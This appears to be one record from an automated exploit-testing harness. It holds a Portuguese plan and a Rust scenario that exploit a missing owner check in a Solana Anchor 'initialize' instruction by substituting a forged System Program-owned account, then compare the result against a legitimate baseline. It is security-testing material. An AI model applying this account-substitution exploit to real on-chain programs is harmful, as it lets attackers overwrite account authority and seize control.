attempts.raw:
{
  "plan": "O programa `initialize` recebe `user` como `AccountInfo` e grava o campo `authority` nos dados da conta sem verificar o owner. O baseline usa uma conta `user` legítima (dono = program_id) com dados iniciais válidos e uma authority signer; o ataque substitui essa conta por uma conta forjada com dono diferente (ex.: System Program) e dados controlados, mantendo a mesma authority. O efeito medido é que a conta forjada foi aceita e teve seus dados sobrescritos com a authority do atacante, apesar de não pertencer ao programa.",
  "scenario": "let authority = Pubkey::new_unique();
let user_legit = Pubkey::new_unique();
let user_forged = Pubkey::new_unique();

// Conta legítima: dono é o programa, dados iniciais válidos (authority = Pubkey::default())
let legit_data = anchor_account_data("User", &(Pubkey::default(),));
let legit_account = account(&env.program_id, &legit_data, None);

// Conta forjada: dono diferente (System Program), dados iniciais controlados
let forged_data = anchor_account_data("User", &(Pubkey::new_unique(),));
let forged_account = account(&solana_sdk::system_program::ID, &forged_data, None);

// Baseline: uso legítimo com a conta do programa
let ix_baseline = env.anchor_ix(
    "initialize",
    &(),
    &[
        AccountMeta::new(user_legit, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_baseline = vec![
    (user_legit, legit_account.clone()),
    (authority, wallet(1_000_000_000)),
];
let r_baseline = env.baseline("initialize legitimo", &ix_baseline, &contas_baseline);

// Ataque: mesma instrução, mas com conta forjada de outro dono
let ix_attack = env.anchor_ix(
    "initialize",
    &(),
    &[
        AccountMeta::new(user_forged, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_attack = vec![
    (user_forged, forged_account),
    (authority, wallet(1_000_000_000)),
];
let r_attack = env.attack("initialize com conta forjada", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let dados = after(&r_attack, &user_forged).data();
    let authority_gravada = read_pubkey(dados, 8); // 8 bytes de discriminador + 32 bytes de authority
    env.effect(
        "conta forjada de outro dono foi aceita e teve authority sobrescrita",
        authority_gravada == authority,
    );
}"
}

